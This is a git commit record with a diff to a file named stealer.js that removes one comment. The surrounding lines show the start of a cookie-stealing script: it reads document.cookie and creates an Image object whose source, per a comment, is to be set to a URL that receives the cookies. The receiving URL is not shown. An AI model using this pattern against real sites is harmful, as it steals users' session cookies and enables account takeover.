105f80fdc9697a1356c358937605c6cdbc0a409a
Elon masai <123534505+elonmasai7@users.noreply.github.com>
2025-03-07 20:26:11 +0300

    Update stealer.js

--- stealer.js
+++ stealer.js
@@ -1,7 +1,6 @@
 // Get the cookies from the document
 const cookies = document.cookie;
 
-// Create a new Image object to send the cookies to a remote server
 const img = new Image();
 
 // Set the src attribute of the Image object to a URL that will receive the cookies
